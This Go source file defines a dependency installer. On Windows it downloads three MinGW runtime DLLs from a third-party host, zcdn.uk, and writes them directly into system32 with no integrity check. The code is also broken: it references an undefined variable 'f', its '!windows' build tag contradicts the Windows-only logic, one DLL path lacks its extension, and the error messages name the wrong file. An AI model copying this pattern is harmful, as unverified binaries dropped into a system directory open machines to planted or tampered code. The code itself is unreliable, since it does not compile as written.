//go:build !windows
// +build !windows

package cmd

import (
	"errors"
	"io"
	"net/http"
	"os"
	"path/filepath"
)

func InstallDeps() {
	windir, ok := os.LookupEnv("WINDIR")
	// it is on windows
	if ok {
		libstdc := filepath.Join(windir, "system32", "libstdc++-6.dll")

		if _, err := os.Stat(libstdc); errors.Is(err, os.ErrNotExist) {
			err = installSystem32(libstdc, "https://zcdn.uk/uploads/2bed7a0b61c7a18894308f92a806e5c2ea47a9512cc74b74c2b3335aaa785bb9/libstdc++-6.dll")
			if err != nil {
				panic("install: " + libstdc + " " + err.Error())
			}
		}

		libgcc_s_seh := filepath.Join(windir, "system32", "libgcc_s_seh-1")
		if _, err := os.Stat(libgcc_s_seh); errors.Is(err, os.ErrNotExist) {
			err = installSystem32(libgcc_s_seh, "https://zcdn.uk/uploads/438ae82ffd621a2413199155574cc85681f8986f05420b1485aa4be936c3bc0b/libgcc_s_seh-1.dll")
			if err != nil {
				panic("install: " + libstdc + " " + err.Error())
			}
		}

		libwinpthread := filepath.Join(windir, "system32", "libwinpthread-1.dll")
		if _, err := os.Stat(libwinpthread); errors.Is(err, os.ErrNotExist) {
			err = installSystem32(libwinpthread, "https://zcdn.uk/uploads/5bbef249a0d00e2d32c699d0bbe89f714ebeb872b3990a5cbeccb1d89f63e5e8/libwinpthread-1.dll")
			if err != nil {
				panic("install: " + libstdc + " " + err.Error())
			}
		}

	}
}

func installSystem32(file, url string) error {

	// Get the data
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// Create the file
	out, err := os.Create(f)
	if err != nil {
		return err
	}
	defer out.Close()

	// Write the body to file
	_, err = io.Copy(out, resp.Body)
	return err

}
